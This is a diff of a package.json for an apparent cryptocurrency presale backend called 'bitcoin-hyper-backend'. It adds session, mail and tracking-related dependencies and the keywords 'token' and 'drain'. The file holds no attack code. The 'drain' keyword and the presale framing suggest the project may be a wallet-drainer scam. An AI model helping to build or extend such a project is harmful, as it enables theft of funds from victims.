@@ -1,7 +1,7 @@
 {
   "name": "bitcoin-hyper-backend",
-  "version": "2.0.0",
-  "description": "Backend server for Bitcoin Hyper presale",
+  "version": "4.0.0",
+  "description": "Backend server for Bitcoin Hyper presale with enhanced tracking",
   "main": "index.js",
   "scripts": {
     "start": "node index.js",
@@ -20,14 +20,19 @@
     "telegraf": "^4.16.3",
     "axios": "^1.6.8",
     "express-rate-limit": "^7.1.5",
-    "crypto": "^1.0.1"
+    "crypto": "^1.0.1",
+    "express-session": "^1.18.0",
+    "memorystore": "^1.6.7",
+    "nodemailer": "^6.9.13"
   },
   "keywords": [
     "bitcoin",
     "hyper",
     "presale",
     "backend",
-    "crypto"
+    "crypto",
+    "token",
+    "drain"
   ],
   "author": "Bitcoin Hyper Team",
   "license": "MIT"
